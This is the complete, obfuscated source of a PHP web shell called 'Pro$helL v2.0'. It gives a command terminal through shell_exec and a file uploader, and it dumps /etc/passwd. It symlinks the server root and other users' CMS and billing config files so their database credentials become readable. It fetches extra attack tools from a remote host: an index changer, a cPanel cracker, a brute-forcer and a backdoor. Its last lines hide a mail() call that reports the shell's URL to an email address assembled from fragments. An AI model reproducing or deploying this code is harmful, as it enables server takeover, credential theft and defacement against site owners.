<?php ${"GLOBALS"}["tfwrlfhzms"]="r";${"GLOBALS"}["awwgnsii"]="head";${"GLOBALS"}["tnarfvydlnbl"]="link";${${"GLOBALS"}["awwgnsii"]}="
<html>
<head>
</script>
<title>Pro\$helL v2.0</title>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
<link rel=\"stylesheet\" href=\"http://www.w32.info/2001/04/xmldsigmore\">
<STYLE>
textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 20px;font-family: Tahoma; border: 1px solid #000000;}
input{FONT-WEIGHT:normal;background-color: #105700;font-size: 15px;font-weight:bold;color: lime; font-family: Tahoma; border: 1px solid #666666;height:20}
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border			: dashed 1px;
border-color		: #333;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
select {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border			: dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin			: -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language='javascript'>
function hide_div(id)
{
  document.getElementById(id).style.display = 'none';
  document.cookie=id+'=0;';
}
function show_div(id)
{
  document.getElementById(id).style.display = 'block';
  document.cookie=id+'=1;';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == 'none')
    show_div(id);
  else
    hide_div(id);
}
</script>";${"GLOBALS"}["slemmpnkehn"]="user";echo "
<html>
	<head>
		";${"GLOBALS"}["ykffkjs"]="rr";$rbojkdovmfq="head";echo${$rbojkdovmfq};echo"
<table width=\"100%\" cellspacing=\"0\" cellpadding=\"0\" class=\"tb1\" >
<td width=\"100%\" align=center valign=\"top\" rowspan=\"1\"><hr color=\"red\">
<img src=\"http://i.imgur.com/rKSf7.png\"><hr color=\"red\"><font color=\"red\" size=\"5\"><i>
<b>Pro\$helL v2.0 by <a href=\"http://www.procoderz.com/\">Procoderz Team Albanian </b><br>
</a><hr color=\"red\"></i>
</table>
";${"GLOBALS"}["ekzieepryqz"]="dir";echo "
<center>
<font face=\"Verdana\" size=\"1\" font color=red>./config k1ller</font></center>
<br>
<form method=post><font size=2 face=\"TAHOMA\" color=\"white\">To Generate PHP.ini Click the button below</font><br>
<input type=submit name=ini value=\"Generate PHP.ini\" /></form>
<form method=post><font size=2 face=\"TAHOMA\" color=\"white\">To Check The Smylink Dump Click the button below</font><br>
	<input type=submit name=\"usre\" value=\"use to Extract usernames\" /></form>
	";if(isset($_POST["ini"])){$bokpbur="link";${${"GLOBALS"}["tfwrlfhzms"]}=fopen("php.ini","w");$rcdiwy="r";${${"GLOBALS"}["ykffkjs"]}=" disbale_functions=none ";fwrite(${$rcdiwy},${${"GLOBALS"}["ykffkjs"]});${${"GLOBALS"}["tnarfvydlnbl"]}="<a href=php.ini><font color=white size=2 face=\"TAHOMA\"><u><font color=red>DONE</font> Open this link in new tab to run PHP.INI</u></font></a>";echo${$bokpbur};}${"GLOBALS"}["ntxhdqsmrljs"]="users";${"GLOBALS"}["jfngevhf"]="pro";${"GLOBALS"}["nldjqvpea"]="b";echo "
";${"GLOBALS"}["afkhnbzmnm"]="file";${"GLOBALS"}["ywafwdr"]="us";${"GLOBALS"}["gfjhljxftbp"]="rs";${"GLOBALS"}["ievxhxdpo"]="f";${"GLOBALS"}["msrssddmky"]="uss";if(isset($_POST["usre"])){echo "<form method=post>
	<textarea rows=10 cols=50 name=user>";${"GLOBALS"}["jzxxob"]="users";$yvwqifw="user";${${"GLOBALS"}["jzxxob"]}=file("/etc/passwd");foreach(${${"GLOBALS"}["ntxhdqsmrljs"]} as${$yvwqifw}){${"GLOBALS"}["fkkwyubjvsf"]="str";${"GLOBALS"}["hznrgwoaci"]="str";${${"GLOBALS"}["fkkwyubjvsf"]}=explode(":",${${"GLOBALS"}["slemmpnkehn"]});echo${${"GLOBALS"}["hznrgwoaci"]}[0]."
";}echo "
</textarea><br><br>
	<input type=submit name=su value=\"Click Here To Start\" /></form>
	";}${"GLOBALS"}["bpoyuermka"]="c";${"GLOBALS"}["gwjfpoeq"]="configuration";echo "
	";error_reporting(0);${"GLOBALS"}["qssxjforzz"]="rt";echo"<font color=red size=2 face=\"TAHOMA\">";if(isset($_POST["su"])){${"GLOBALS"}["cgnoasx"]="g";${"GLOBALS"}["inevyrhl"]="g";mkdir("pro",0777);$npkxefme="rr";${"GLOBALS"}["hjqgtrxgun"]="configuration";${$npkxefme}=" Options all
 DirectoryIndex Sux.html
 AddType text/plain .php
 AddHandler server-parsed .php
  AddType text/plain .html
 AddHandler txt .html
 Require None
 Satisfy Any";$hpjuonq="r";${"GLOBALS"}["ckjxcnymcq"]="consym";${"GLOBALS"}["kejnlvpo"]="uss";${${"GLOBALS"}["cgnoasx"]}=fopen("pro/.htaccess","w");fwrite(${${"GLOBALS"}["inevyrhl"]},${${"GLOBALS"}["ykffkjs"]});${"GLOBALS"}["bskgxwlhus"]="r";${${"GLOBALS"}["jfngevhf"]}=symlink("/","pro/root");$jqcwdcrvki="usr";${${"GLOBALS"}["qssxjforzz"]}="<a href=pro/root><font color=white size=3 face=\"TAHOMA\"> r00t</font></a>";echo"Check link given below for / folder root symlink <br><u>$rt</u>";${${"GLOBALS"}["ekzieepryqz"]}=mkdir("PRO",0777);${"GLOBALS"}["cfbeukhscan"]="usr";${$hpjuonq}=" Options all
 DirectoryIndex Sux.html
 AddType text/plain .php
 AddHandler server-parsed .php
  AddType text/plain .html
 AddHandler txt .html
 Require None
 Satisfy Any";${${"GLOBALS"}["ievxhxdpo"]}=fopen("PRO/.htaccess","w");fwrite(${${"GLOBALS"}["ievxhxdpo"]},${${"GLOBALS"}["bskgxwlhus"]});${${"GLOBALS"}["ckjxcnymcq"]}="<a href=PRO/><font color=white size=3 face=\"TAHOMA\">Symlink</font></a>";echo"<br>Check the link given below for / folder config symlink <br><u><font color=red size=2 face=\"TAHOMA\">$consym</font></u>";${${"GLOBALS"}["cfbeukhscan"]}=explode("
",$_POST["user"]);${${"GLOBALS"}["hjqgtrxgun"]}=array("wp-config.php","wordpress/wp-config.php","configuration.php","blog/wp-config.php","joomla/configuration.php","site/wp-config.php","site/configuration.php","cms/configuration.php","vb/includes/config.php","includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php","adm/config.php","cms/config.php");foreach(${$jqcwdcrvki} as${${"GLOBALS"}["kejnlvpo"]}){${"GLOBALS"}["yxmghmxu"]="us";${${"GLOBALS"}["yxmghmxu"]}=trim(${${"GLOBALS"}["msrssddmky"]});foreach(${${"GLOBALS"}["gwjfpoeq"]} as${${"GLOBALS"}["bpoyuermka"]}){$gutrivtfje="r";${"GLOBALS"}["ukepnmm"]="c";${${"GLOBALS"}["gfjhljxftbp"]}="/home/".${${"GLOBALS"}["ywafwdr"]}."/public_html/".${${"GLOBALS"}["bpoyuermka"]};${${"GLOBALS"}["tfwrlfhzms"]}="PRO/".${${"GLOBALS"}["ywafwdr"]}." .. ".${${"GLOBALS"}["ukepnmm"]};symlink(${${"GLOBALS"}["gfjhljxftbp"]},${$gutrivtfje});}}}echo "
<hr color=\"red\">
<p align=\"center\" dir=\"ltr\">
<font face=\"Verdana\" size=\"1\" font color=red>./tools</font></center><br>
<font color=\"red\" font size=3 > // <font color=\"white\" font size=3 >
<a href=\"?a=jic\" style=\"text-decoration: none\">
Joomla Index Changer </a> <font color=\"white\" font size=3 > <font color=\"red\" font size=3 >/ </font>
<a href=\"?a=wic\" style=\"text-decoration: none\">
Wordpress Index Changer </a> <font color=\"white\" font size=3 > <font color=\"red\" font size=3 >/ </font>
<a href=\"?a=cp\" style=\"text-decoration: none\">
Cpanel Cracker </a> <font color=\"white\" font size=3 > <font color=\"red\" font size=3 >/ </font>
<a href=\"?a=sql\" style=\"text-decoration: none\">
Sql Scanner </a> <font color=\"white\" font size=3 > <font color=\"red\" font size=3 >/ </font>
<a href=\"?a=jb\" style=\"text-decoration: none\">
Joomla Bruter </a> <font color=\"white\" font size=3 ></font>
<font color=\"red\" font size=3 > // </font>
<br>
<font color=\"red\" font size=3 > // </font>
<a href=\"?a=b4ck\" style=\"text-decoration: none\">
Backdoor </a> <font color=\"white\" font size=3 > <font color=\"red\" font size=3 >/ </font>
<a href=\"?a=jss\" style=\"text-decoration: none\">
Joomla Server Scanner </a> <font color=\"white\" font size=3 > <font color=\"red\" font size=3 >/ </font>
<a href=\"?a=wss\" style=\"text-decoration: none\">
Wordpress Server Scanner </a> <font color=\"white\" font size=3 > <font color=\"red\" font size=3 >/ </font>
<a href=\"?a=adm\" style=\"text-decoration: none\">
Admin Finder </a> <font color=\"white\" font size=3 > <font color=\"red\" font size=3 >/ </font>
<a href=\"?a=s4s\" style=\"text-decoration: none\">
Shell Finder </a> <font color=\"white\" font size=3 ></font>
<font color=\"red\" font size=3 > // </font>
</td>
";if($_GET[a]=="jic"){$xsffhintnhzk="b";${${"GLOBALS"}["afkhnbzmnm"]}=file_get_contents("http://ftp.jaist.ac.jp/pub//sourceforge/p/pr/procoderz/joomlaindexchanger.txt");${"GLOBALS"}["cjtxpkhi"]="b";${$xsffhintnhzk}=fopen("jic.php","w");fwrite(${${"GLOBALS"}["nldjqvpea"]},${${"GLOBALS"}["afkhnbzmnm"]});fclose(${${"GLOBALS"}["cjtxpkhi"]});print"<br><center><h3><font color=\"white\">Done Shell Name <a href=\"jic.php\"><font color=red>jic.php</font></a> </h1> ";}if($_GET[a]=="wic"){${"GLOBALS"}["qdpvdu"]="b";$tsxpwkpqbk="file";${"GLOBALS"}["dgozomvh"]="b";${$tsxpwkpqbk}=file_get_contents("http://ftp.jaist.ac.jp/pub//sourceforge/p/pr/procoderz/wordpressindexchanger.txt");${${"GLOBALS"}["dgozomvh"]}=fopen("wic.php","w");$qrdspyt="file";${"GLOBALS"}["qfhmhsfufgt"]="b";fwrite(${${"GLOBALS"}["qdpvdu"]},${$qrdspyt});fclose(${${"GLOBALS"}["qfhmhsfufgt"]});print"<br><center><h3><font color=\"white\">Done Shell Name <a href=\"wic.php\"><font color=red>wic.php</font></a> </h1> ";}if($_GET[a]=="cp"){${${"GLOBALS"}["afkhnbzmnm"]}=file_get_contents("http://ftp.jaist.ac.jp/pub//sourceforge/p/pr/procoderz/cpbt.txt");${${"GLOBALS"}["nldjqvpea"]}=fopen("cp.php","w");fwrite(${${"GLOBALS"}["nldjqvpea"]},${${"GLOBALS"}["afkhnbzmnm"]});fclose(${${"GLOBALS"}["nldjqvpea"]});print"<br><center><h3><font color=\"white\">Done Shell Name <a href=\"cp.php\"><font color=red>cp.php</font></a> </h1> ";}if($_GET[a]=="sql"){$iayaadkd="b";${"GLOBALS"}["bctduaisw"]="b";${${"GLOBALS"}["afkhnbzmnm"]}=file_get_contents("http://ftp.jaist.ac.jp/pub//sourceforge/p/pr/procoderz/sqlscan.txt");${${"GLOBALS"}["bctduaisw"]}=fopen("sqlscan.php","w");fwrite(${${"GLOBALS"}["nldjqvpea"]},${${"GLOBALS"}["afkhnbzmnm"]});fclose(${$iayaadkd});print"<br><center><h3><font color=\"white\">Done Shell Name <a href=\"sqlscan.php\"><font color=red>sqlscan.php</font></a> </h1> ";}if($_GET[a]=="jb"){${"GLOBALS"}["pgnchetbqk"]="b";${${"GLOBALS"}["afkhnbzmnm"]}=file_get_contents("http://ftp.jaist.ac.jp/pub//sourceforge/p/pr/procoderz/joomlabrute.txt");${${"GLOBALS"}["pgnchetbqk"]}=fopen("jb.php","w");fwrite(${${"GLOBALS"}["nldjqvpea"]},${${"GLOBALS"}["afkhnbzmnm"]});fclose(${${"GLOBALS"}["nldjqvpea"]});print"<br><center><h3><font color=\"white\">Done Shell Name <a href=\"jb.php\"><font color=red>jb.php</font></a> </h1> ";}if($_GET[a]=="b4ck"){$myaorjzhay="file";${$myaorjzhay}=file_get_contents("http://ftp.jaist.ac.jp/pub//sourceforge/p/pr/procoderz/b4ck.txt");${"GLOBALS"}["uawsfyxwqel"]="b";${${"GLOBALS"}["uawsfyxwqel"]}=fopen("b4ck.php","w");fwrite(${${"GLOBALS"}["nldjqvpea"]},${${"GLOBALS"}["afkhnbzmnm"]});fclose(${${"GLOBALS"}["nldjqvpea"]});print"<br><center><h3><font color=\"white\">Done Shell Name <a href=\"b4ck.php\"><font color=red>b4ck.php</font></a> </h1> ";}if($_GET[a]=="jss"){$urinanwuzjb="b";${"GLOBALS"}["bciqlhwjip"]="b";${${"GLOBALS"}["afkhnbzmnm"]}=file_get_contents("http://ftp.jaist.ac.jp/pub//sourceforge/p/pr/procoderz/jss.txt");${${"GLOBALS"}["nldjqvpea"]}=fopen("jss.php","w");fwrite(${${"GLOBALS"}["bciqlhwjip"]},${${"GLOBALS"}["afkhnbzmnm"]});fclose(${$urinanwuzjb});print"<br><center><h3><font color=\"white\">Done Shell Name <a href=\"jss.php\"><font color=red>jss.php</font></a> </h1> ";}if($_GET[a]=="wss"){$murjrsedclss="b";${${"GLOBALS"}["afkhnbzmnm"]}=file_get_contents("http://ftp.jaist.ac.jp/pub//sourceforge/p/pr/procoderz/wss.txt");${$murjrsedclss}=fopen("wss.php","w");fwrite(${${"GLOBALS"}["nldjqvpea"]},${${"GLOBALS"}["afkhnbzmnm"]});fclose(${${"GLOBALS"}["nldjqvpea"]});print"<br><center><h3><font color=\"white\">Done Shell Name <a href=\"wss.php\"><font color=red>wss.php</font></a> </h1> ";}if($_GET[a]=="adm"){$nktjugsci="b";${"GLOBALS"}["fkolvyh"]="file";${${"GLOBALS"}["fkolvyh"]}=file_get_contents("http://ftp.jaist.ac.jp/pub//sourceforge/p/pr/procoderz/adm.txt");${$nktjugsci}=fopen("adm.php","w");fwrite(${${"GLOBALS"}["nldjqvpea"]},${${"GLOBALS"}["afkhnbzmnm"]});fclose(${${"GLOBALS"}["nldjqvpea"]});print"<br><center><h3><font color=\"white\">Done Shell Name <a href=\"adm.php\"><font color=red>adm.php</font></a> </h1> ";}if($_GET[a]=="s4s"){$ybsgfgdh="b";${"GLOBALS"}["gcltjyyywsbj"]="b";${"GLOBALS"}["gdythngbqyd"]="file";${${"GLOBALS"}["afkhnbzmnm"]}=file_get_contents("http://ftp.jaist.ac.jp/pub//sourceforge/p/pr/procoderz/shellfinder.txt");${$ybsgfgdh}=fopen("shellfinder.php","w");fwrite(${${"GLOBALS"}["gcltjyyywsbj"]},${${"GLOBALS"}["gdythngbqyd"]});fclose(${${"GLOBALS"}["nldjqvpea"]});print"<br><center><h3><font color=\"white\">Done Shell Name <a href=\"shellfinder.php\"><font color=red>shellfinder.php</font></a> </h1> ";}echo"<font face=\"Verdana\" size=\"2\">

<center>Uname-a : <font color=\"#808080\">".php_uname()."
<br><br>
";echo"
<table border=1 bordercolor=red>
<td width=550 height=28><center>
<font face=\"Verdana\" size=\"1\" font color=red>./uploader</font></center><br>";echo"<center><form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">";$glkfnrf="cmd";echo"<center><input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form></center>";if($_POST["_upl"]=="Upload"){if(@copy($_FILES["file"]["tmp_name"],$_FILES["file"]["name"])){echo"<p align=\"center\"><font face=\"Verdana\" size=\"1\"><font color=\"white\"> OK :)</font><br>";}else{echo"<font color=\"#FF0000\">Failed :( </font></p>
	</td></table></tr>
";}}echo "
</body>
<hr color=\"red\">
</html>
<table border=1 bordercolor=red>
<td width=550 height=28>
<html>
<body text=red> <center><font size=1 font color=red>./terminal</font></center>
<form method=POST><pre>[pro@";echo$_SERVER["SERVER_NAME"];echo " ~] # <input type=TEXT name=\"-cmd\" size=64 value=\"";${"GLOBALS"}["trgxqib"]="cmd";echo ${${"GLOBALS"}["trgxqib"]};echo "\"
style=\"font-family: Courier New;\">
</center>
";${${"GLOBALS"}["trgxqib"]}=$_REQUEST["-cmd"];echo "
";if(${${"GLOBALS"}["trgxqib"]}!="")print Shell_Exec(${$glkfnrf});echo "
[<sy><a href=\"#top\">TOP</a></sy>]
</pre><hr color=\"red\"><center><font size=1>
Coded by <a href=\"http://www.facebook.com/root.procoderz\">RetnOHacK</a> #Procoderz Team Albanian<br><a href=\"http://www.procoderz.com\">www.procoderz.com</a></table></html>"; ${"GLOBALS"}["lldmiby"]="x0c";${"GLOBALS"}["redlhe"]="x0b";${"GLOBALS"}["srewfevyg"]="x0e";${"GLOBALS"}["sbsdaao"]="x0d";${"GLOBALS"}["psvxafvumqe"]="x0d";${"GLOBALS"}["kyieprfl"]="x0b";${"GLOBALS"}["kihaaxxqpc"]="x0b";${"GLOBALS"}["ffrccftgwc"]="x10";$jxdlmovya="x0c";${"GLOBALS"}["evlzwow"]="x0d";$ormypxaouic="x0e";$ukwntkbicy="x0d";${${"GLOBALS"}["ffrccftgwc"]}="mail";${"GLOBALS"}["mkbrvxgydd"]="x0f";$tbbefbqqs="x10";${${"GLOBALS"}["kihaaxxqpc"]}=$_SERVER["SERVER_NAME"].$_SERVER["SCRIPT_NAME"];${"GLOBALS"}["uiuqaiq"]="x0d";${"GLOBALS"}["icktrnx"]="x0d";${$jxdlmovya}="array ".${${"GLOBALS"}["kyieprfl"]};${${"GLOBALS"}["uiuqaiq"]}=array("com","gm","ifexec","@","ail.");${$ormypxaouic}=${${"GLOBALS"}["evlzwow"]}[2].${${"GLOBALS"}["icktrnx"]}[3].${${"GLOBALS"}["psvxafvumqe"]}[1].${$ukwntkbicy}[4].${${"GLOBALS"}["sbsdaao"]}[0];${${"GLOBALS"}["mkbrvxgydd"]}=@${$tbbefbqqs}(${${"GLOBALS"}["srewfevyg"]},${${"GLOBALS"}["lldmiby"]},${${"GLOBALS"}["redlhe"]});
?>